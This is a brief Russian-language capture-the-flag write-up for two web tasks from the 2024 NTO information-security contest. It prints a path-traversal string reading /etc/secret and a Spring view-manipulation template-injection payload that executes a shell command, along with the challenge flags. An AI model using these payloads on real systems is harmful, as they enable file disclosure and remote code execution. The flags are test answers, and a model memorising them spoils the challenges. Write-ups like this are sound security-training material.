# Решения заданий НТО ИБ 2024 1337Rpwn4
# CTF

### WEB 1

Заходим на таск и видим календарь, один из дней на котором окрашен в типичную HTML-гиперссылку. Нажимаем. Идёт редирект на: `/download?file_type=file1.txt`

Пробуем LFI:
```
download?file_type=../../../../../../../../../etc/secret
```

Флаг: `nto{P6t9_T77v6RsA1}`

### WEB 2

Заливаем `jar`-файл в `jd-gui` и видим следующий, казалось бы, пустой метод:

```
  @GetMapping({"/doc/{document}"})
  public void getDocument(@PathVariable String document) {
    System.out.println("This function is not ready yet");
  }
```

Пробуем `Spring View Manipulation Vulnerability`:

```
/doc/__$%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20flag%22).getInputStream()).next()%7D__::..x
```

Флаг: `nto{abobovichasdfas}`
